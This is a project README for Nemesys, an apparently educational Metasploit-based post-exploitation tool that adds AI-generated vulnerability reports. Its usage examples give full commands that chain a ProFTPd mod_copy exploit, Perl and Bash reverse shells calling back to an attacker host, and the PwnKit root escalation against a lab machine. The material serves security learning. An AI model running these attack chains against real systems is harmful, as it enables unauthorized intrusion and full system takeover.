# **Nemesys**: ⚡ Critical Data Harvesting & 🛠️ Post-Exploitation Tool 🕵️‍♂️

**Nemesys** is a personal educational project created during a **Cybersecurity course** with the purpose of combining **cybersecurity** and **AI** to **automate the discovery of vulnerabilities** 🕵️‍♂️. Built on top of the **Metasploit Framework**, this tool is designed to help learners and aspiring cybersecurity professionals discover weaknesses and misconfigurations in vulnerable systems.

Nemesys focuses on automating the identification of vulnerabilities and supporting **post-exploitation tasks** to help understand how to analyze compromised systems. By combining powerful AI-driven reporting, this project aims to improve the process of vulnerability discovery and enhance learning for those studying network and system security. ⚔️

🙏 A special thanks to [Santiago Hernández, a leading expert in Cybersecurity and Artificial Intelligence](https://www.udemy.com/user/shramos/), whose **Cybersecurity and Ethical Hacking** course on Udemy played a crucial role in shaping the development of this project. The knowledge and insights gained were fundamental in merging cybersecurity practices with AI tools to enhance vulnerability analysis.

### Testing Information 🧪
All tests and exploitation workflows in **Nemesys** were conducted in a **controlled, ethical environment** using **Metasploitable Ubuntu**, a deliberately vulnerable machine designed for security testing and learning. The testing took place in a dedicated **lab environment** to ensure ethical usage and avoid any unauthorized access to external systems. The results from these tests demonstrate **Nemesys**'s effectiveness in discovering vulnerabilities and analyzing systems safely and legally.

<p align="center">
  <img src="https://img.shields.io/badge/langchain-1C3C3C?style=for-the-badge&logo=langchain&logoColor=white" />
  <img src="https://img.shields.io/badge/Kali_Linux-557C94?style=for-the-badge&logo=kali-linux&logoColor=white" />
  <img src="https://img.shields.io/badge/Python-FFD43B?style=for-the-badge&logo=python&logoColor=blue" />
</p>

<p align="center">
  <img src="doc/screenshots/picture_1.PNG" />
</p>

## ⚠️ Disclaimer  

**Nemesys** has been developed **solely for educational and research purposes** as part of my learning process in **cybersecurity, pentesting, and post-exploitation automation**. This project was created to **practice the knowledge acquired during a cybersecurity course**, experiment with advanced techniques in a **controlled lab environment**, and add it to my **portfolio of cybersecurity projects**.  

This tool is designed **exclusively for ethical hacking and authorized security assessments**. Its use **must be strictly limited to environments where explicit permission has been granted**, such as testing labs, cybersecurity training, or approved security audits.  

**Unauthorized use of this tool on external systems is strictly prohibited** and may violate laws.  

**I disclaim any responsibility for improper use of this tool.** **Always act within legal and ethical boundaries, and obtain proper authorization before conducting any security testing.**

All tests and exploitation workflows in **Nemesys** were conducted in a controlled environment using **Metasploitable Ubuntu**, a deliberately vulnerable machine designed for security testing and training. This testing was carried out in a dedicated **lab environment** to ensure ethical use and avoid unauthorized access to any external systems. The results of these tests demonstrate the tool’s effectiveness in identifying and exploiting vulnerabilities in a controlled, safe, and legal environment.

## More Details 📝

For a deeper dive into the concepts and development of this project, I invite you to read my [Medium article](https://sanchezsanchezsergio418.medium.com/harnessing-generative-ai-for-post-exploitation-vulnerability-reporting-in-cybersecurity-a-5ba3e53958ec), where I explore the integration of AI into cybersecurity and how it aids in vulnerability discovery and reporting.

## 🚀✨ Key Features

- 🔍 **Automated Vulnerability Discovery**: Easily identify vulnerabilities by automating exploitation tasks with Metasploit, allowing for efficient system analysis and vulnerability reporting.
- 🛡️ **Privilege Escalation**: Gain insights into the process of privilege escalation using built-in Metasploit modules to test for elevated access vulnerabilities.
- ⬆️ **Session Upgrade to Meterpreter**: Learn how to upgrade basic shell sessions into fully interactive Meterpreter sessions for more detailed exploitation and analysis.
- 💻 **Interactive Reverse Shell**: Understand how to establish and utilize an interactive reverse shell to conduct deeper manual system analysis and vulnerability discovery.
- 🗂️ **System Enumeration & Data Harvesting**: Gain hands-on experience in collecting crucial information about target systems, such as OS versions, network configurations, and active processes, which are vital for vulnerability identification.
- 🧠 **AI-Enhanced Reporting**: Use AI-powered tools like **LangChain** and **Groq** for cloud-based processing to generate comprehensive reports on vulnerabilities, next steps, and remediation strategies.
- 🤖 **Integration with Metasploit RPC**: Learn how to integrate Metasploit’s RPC interface into your exploitation workflows to manage active sessions and modules efficiently.
- 🛠️ **User-Friendly & Extensible**: Designed with an intuitive interface to help you quickly navigate and adapt it to different penetration testing scenarios, improving your skills as you grow in the field of ethical hacking.

## 🔧💻 Requirements

- 🐍 **Python 3.8+**: Required for running the Nemesys scripts.
- 🦾 **Metasploit Framework**: Installed and configured for exploit execution.
- ☁️ **LangChain** and **Groq**: Access for cloud-based LLM processing with Groq's powerful AI model.
- 🔑 **Root or Admin Privileges**: Necessary for full functionality and executing privileged exploits.
- 🧠 **FAISS**: Set up for efficient similarity search and retrieval in the RAG (Retrieval-Augmented Generation) process.
- 🤗 **HuggingFaceEmbeddings**: Required for embedding documents and enhancing the RAG technique for optimal security analysis.

<p align="center">
  <img src="doc/screenshots/picture_3.PNG" />
</p>

## 🔧🧩 **Component Breakdown**: 🔍 Exploring the Building Blocks of Nemesys ⚙️

Nemesys is designed with a modular architecture, where each component has a distinct responsibility, making the exploitation and post-exploitation process efficient and streamlined. Below is a detailed overview of each core component:

### 1. **MetasploitClient** 🕵️‍♂️

The **MetasploitClient** serves as the connection interface between Nemesys and the Metasploit RPC API.

- **Responsibilities**:
  - Establishes and manages the connection to the Metasploit RPC server.
  - Handles secure API requests with SSL support.
  - Provides a client object used by other components for unified Metasploit interactions.

- **Integration**:
  - Initiated during the setup of Nemesys to validate connectivity.
  - Essential for all interactions with Metasploit modules across components.

<p align="center">
  <img src="doc/screenshots/picture_4.PNG" />
</p>

### 2. **ExploitManager** 💥

The **ExploitManager** handles the execution of exploits against target systems using Metasploit.

- **Responsibilities**:
  - Executes chosen exploit modules with specified payloads.
  - Configures options for both exploit and payload modules (e.g., `RHOSTS`, `LPORT`).
  - Tracks exploit attempts using UUIDs for result monitoring.

- **Integration**:
  - Triggered by the `run_attack()` method to start the exploitation phase.
  - Passes exploit UUIDs to the **SessionManager** for session tracking.

### 3. **SessionManager** 🔄

The **SessionManager** is in charge of managing sessions, including session upgrades and tracking active sessions.

- **Responsibilities**:
  - Retrieves session IDs based on the exploit UUID returned by the **ExploitManager**.
  - Upgrades standard shell sessions to Meterpreter sessions for enhanced capabilities.
  - Lists and manages active sessions for efficient exploitation.

- **Integration**:
  - Central to the transition between the exploitation and post-exploitation phases.
  - Handles session upgrades automatically and tracks session IDs.

### 4. **PrivilegeEscalationManager** 🔓

The **PrivilegeEscalationManager** focuses on elevating privileges after a session has been established.

- **Responsibilities**:
  - Identifies suitable privilege escalation exploits based on system information.
  - Executes privilege escalation modules (e.g., kernel exploits) to gain elevated access.
  - Verifies the success of privilege escalation attempts.

- **Integration**:
  - Optionally invoked in the `run_attack()` method if a privilege escalation module is specified.
  - Collaborates with the **SystemEnumerator** to determine potential escalation paths.

### 5. **ShellInterface** 🖥️

The **ShellInterface** provides an interactive shell for direct command execution on compromised targets.

- **Responsibilities**:
  - Opens an interactive shell session (Meterpreter or standard shell) for manual exploitation.
  - Supports system command execution, script imports, and file transfers.
  - Offers a user-friendly interface for further post-exploitation tasks.

- **Integration**:
  - Invoked at the end of the `run_attack()` process for hands-on interaction with the compromised system.
  - Adjusts the shell type based on the session capabilities (e.g., upgraded Meterpreter session).

<p align="center">
  <img src="doc/screenshots/picture_5.PNG" />
</p>

<p align="center">
  <img src="doc/screenshots/picture_6.PNG" />
</p>


### 6. **SystemEnumerator** 🔍

The **SystemEnumerator** is designed to gather extensive information about the compromised system for analysis.

<p align="center">
  <img src="doc/screenshots/picture_7.PNG" />
</p>

- **Responsibilities**:
  - Collects system details such as OS version, network interfaces, installed software, and running processes.
  - Identifies potential vulnerabilities and misconfigurations using integrated tools like `searchsploit`.
  - Generates initial system assessment reports, aiding in further exploitation decisions.

- **Integration**:
  - Called after session establishment and upgrade to provide critical system information.
  - Supplies data to the **PrivilegeEscalationManager** for identifying privilege escalation opportunities.
  - Capable of generating advanced reports using **LangChain** with LLM analysis through Groq Cloud.

<p align="center">
  <img src="doc/screenshots/picture_8.PNG" />
</p>

<p align="center">
  <img src="doc/screenshots/picture_9.PNG" />
</p>


### 7. **SecurityAnalyzer** 🛡️

The **SecurityAnalyzer** component is responsible for analyzing the system enumeration log and generating comprehensive security reports using advanced AI techniques.

- **Responsibilities**:
  - **Log Analysis**: The **SecurityAnalyzer** processes system enumeration logs received from the **SystemEnumerator** or another log source.
  - **Retrieval-Augmented Generation (RAG)**: Uses **FAISS** for document retrieval and **HuggingFaceEmbeddings** for embedding the logs, allowing the AI model to generate insights based on the retrieved information.
  - **Report Generation**: Creates professional security reports summarizing vulnerabilities, misconfigurations, and providing actionable recommendations.
  - **Format Generation**: Outputs reports in both **PDF** and **JSON** formats, making the insights accessible for both human review and further automation.

- **Integration**:
  - Invoked after the **SystemEnumerator** process to analyze the system log and generate security reports based on the collected data.
  - Leverages the AI model in **LangChain** via **Groq Cloud** for processing and generating tailored security insights.
  - Plays a crucial role in the final analysis phase by providing detailed and actionable recommendations for improving the security posture of the target system.

<p align="center">
  <img src="doc/screenshots/picture_10.PNG" />
</p>

<p align="center">
  <img src="doc/screenshots/picture_11.PNG" />
</p>

<p align="center">
  <img src="doc/screenshots/picture_12.PNG" />
</p>

This modular structure ensures that each component performs its role effectively, contributing to a cohesive and efficient exploitation workflow in Nemesys.

## 🧩 Workflow Overview

The main exploitation process in Nemesys involves the following steps:

1. **Initialization**:
   - Connects to Metasploit using **MetasploitClient** to establish a secure connection to the RPC server.

2. **Exploitation**:
   - Executes the chosen exploit and payload using **ExploitManager**.
   - Retrieves the session ID via **SessionManager** to track exploit progress.

3. **Session Management**:
   - Upgrades the session for enhanced control (e.g., Meterpreter shell) using **SessionManager**.

4. **Privilege Escalation** (Optional):
   - Attempts privilege escalation using **PrivilegeEscalationManager** to gain higher-level access.

5. **System Enumeration**:
   - Gathers extensive system information (OS details, running services, vulnerabilities) using **SystemEnumerator**.
   - The **SystemEnumerator** outputs logs with system data that can later be analyzed.

6. **Security Analysis**:
   - The generated system enumeration log is fed into the **SecurityAnalyzer**.
   - **SecurityAnalyzer** uses advanced techniques (RAG with **FAISS** and **HuggingFaceEmbeddings**) to process the log and generate a detailed security report.

7. **Interactive Shell**:
   - Provides a hands-on interactive shell through **ShellInterface** for manual exploitation, based on the elevated session or analysis results.

## Installation ⚙️
To use Nemesys, you'll need to have the necessary dependencies installed and be able to run the Python script from your terminal.

Clone the repository to your machine:

```bash
git clone https://github.com/sergio11/nemesys.git
```

Navigate to the directory:

```bash
cd nemesys
```
Install dependencies:

```bash
pip install -r requirements.txt
```

## Usage Examples 🚀

Once everything is set up, you can invoke the **Nemesys** tool using the `nemesys_cli.py` script. Below are several examples of how to use it, along with explanations.

### 1. Basic Exploit Invocation 💥

This command runs an exploit with a specific payload and sets up reverse connections for the exploit to work.

```bash
sudo $HOME/Desktop/Nemesys-Kali/bin/python nemesys_cli.py \
  --password "password" \
  --exploit_name "unix/ftp/proftpd_modcopy_exec" \
  --payload_name "cmd/unix/reverse_perl" \
  --rhosts "192.168.11.128" \
  --sitepath "/var/www/html" \
  --lhost "192.168.11.129" \
  --lport 4445 \
  --privilege_exploit "linux/local/cve_2021_4034_pwnkit_lpe_pkexec" \
  --target "192.168.11.128"
```

#### Description 📜:
- `--password "password"`: The password used for authentication on the target system. 🔑
- `--exploit_name "unix/ftp/proftpd_modcopy_exec"`: The specific exploit you want to run, targeting a vulnerability in ProFTPd. 📡
- `--payload_name "cmd/unix/reverse_perl"`: The payload that will execute after the exploit is successful (reverse shell using Perl). 🖥️
- `--rhosts "192.168.11.128"`: The target machine's IP address for the exploit. 🎯
- `--sitepath "/var/www/html"`: The path to the website directory (used in web-based exploits). 🌍
- `--lhost "192.168.11.129"`: Your machine's IP address where the reverse shell will connect back. 🔙
- `--lport 4445`: The local port on your machine that the reverse shell will connect to. ⚙️
- `--privilege_exploit "linux/local/cve_2021_4034_pwnkit_lpe_pkexec"`: A local privilege escalation exploit to gain root access on the target. 🔓
- `--target "192.168.11.128"`: The IP address of the target machine to attack. 🎯
- `--log_file_path "path_to_log_file"`: The path to the system enumeration log file (default: `'system_enumeration.log'`). 📄
- `--pdf_path "path_to_pdf_report"`: The path to save the generated PDF report (default: `'nemesys_report.pdf'`). 📑
- `--json_path "path_to_json_report"`: The path to save the generated JSON report (default: `'nemesys_report.json'`). 📁
- `--verbose`: Enable verbose logging for detailed output (useful for troubleshooting and in-depth analysis). 🔍

#### Expected Outcome 🏆:
Once you execute the command, **Nemesys** will attempt to exploit the ProFTPd vulnerability, trigger a reverse shell on your local machine, and then escalate privileges using the `pwnkit` local privilege escalation vulnerability.

---

### 2. Using a Different Payload 🚨

To use a different payload (e.g., `cmd/unix/reverse_bash`), simply modify the `--payload_name` parameter.

```bash
sudo $HOME/Desktop/Nemesys-Kali/bin/python nemesys_cli.py \
  --password "password" \
  --exploit_name "unix/ftp/proftpd_modcopy_exec" \
  --payload_name "cmd/unix/reverse_bash" \
  --rhosts "192.168.11.128" \
  --sitepath "/var/www/html" \
  --lhost "192.168.11.129" \
  --lport 4445 \
  --privilege_exploit "linux/local/cve_2021_4034_pwnkit_lpe_pkexec" \
  --target "192.168.11.128"
```

#### Change Explained 🔄:
- `--payload_name "cmd/unix/reverse_bash"`: Swapping the payload to a Bash reverse shell. 💥

---

### 3. Exploiting Without Privilege Escalation 🔓

If you don't need to perform privilege escalation, simply omit the `--privilege_exploit` parameter.

```
sudo $HOME/Desktop/Nemesys-Kali/bin/python nemesys_cli.py \
  --password "password" \
  --exploit_name "unix/ftp/proftpd_modcopy_exec" \
  --payload_name "cmd/unix/reverse_perl" \
  --rhosts "192.168.11.128" \
  --sitepath "/var/www/html" \
  --lhost "192.168.11.129" \
  --lport 4445 \
  --target "192.168.11.128"
```

#### What Happens? 🔍
This command will perform the exploit and create a reverse shell without attempting to escalate privileges. It's useful when you only need a foothold without full system control. 💥

### Important Notes

- Make sure to replace `your_groq_api_key_here` and `your_model_id_here` in your `.env` file with your actual API key and model ID.
- Ensure that the specified network range is appropriate for your nemesys setup.


## ⚠️ Disclaimer  

**Nemesys** has been developed **solely for educational and research purposes** as part of my learning process in **cybersecurity, pentesting, and post-exploitation automation**. This project was created to **practice the knowledge acquired during a cybersecurity course**, experiment with advanced techniques in a **controlled lab environment**, and add it to my **portfolio of cybersecurity projects**.  

This tool is designed **exclusively for ethical hacking and authorized security assessments**. Its use **must be strictly limited to environments where explicit permission has been granted**, such as testing labs, cybersecurity training, or approved security audits.  

**Unauthorized use of this tool on external systems is strictly prohibited** and may violate laws.  

**I disclaim any responsibility for improper use of this tool.** **Always act within legal and ethical boundaries, and obtain proper authorization before conducting any security testing.**

All tests and exploitation workflows in **Nemesys** were conducted in a controlled environment using **Metasploitable Ubuntu**, a deliberately vulnerable machine designed for security testing and training. This testing was carried out in a dedicated **lab environment** to ensure ethical use and avoid unauthorized access to any external systems. The results of these tests demonstrate the tool’s effectiveness in identifying and exploiting vulnerabilities in a controlled, safe, and legal environment.

## Acknowledgements 🙏

🙏 I would like to express my sincere gratitude to [Santiago Hernández, a leading expert in Cybersecurity and Artificial Intelligence](https://www.udemy.com/user/shramos/). His outstanding course on **Cybersecurity and Ethical Hacking**, available on Udemy, was instrumental in the development of this project. The insights and techniques I gained from his course were invaluable in guiding my approach to cybersecurity practices. Thank you for sharing your knowledge and expertise!

Special thanks to the open-source community and the contributors who have made this project possible.

## License ⚖️

This project is licensed under the MIT License, an open-source software license that allows developers to freely use, copy, modify, and distribute the software. 🛠️ This includes use in both personal and commercial projects, with the only requirement being that the original copyright notice is retained. 📄

Please note the following limitations:

- The software is provided "as is", without any warranties, express or implied. 🚫🛡️
- If you distribute the software, whether in original or modified form, you must include the original copyright notice and license. 📑
- The license allows for commercial use, but you cannot claim ownership over the software itself. 🏷️

The goal of this license is to maximize freedom for developers while maintaining recognition for the original creators.

```
MIT License

Copyright (c) 2024 Dream software - Sergio Sánchez 

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

## Visitors Count

<img width="auto" src="https://profile-counter.glitch.me/nemesys/count.svg" />
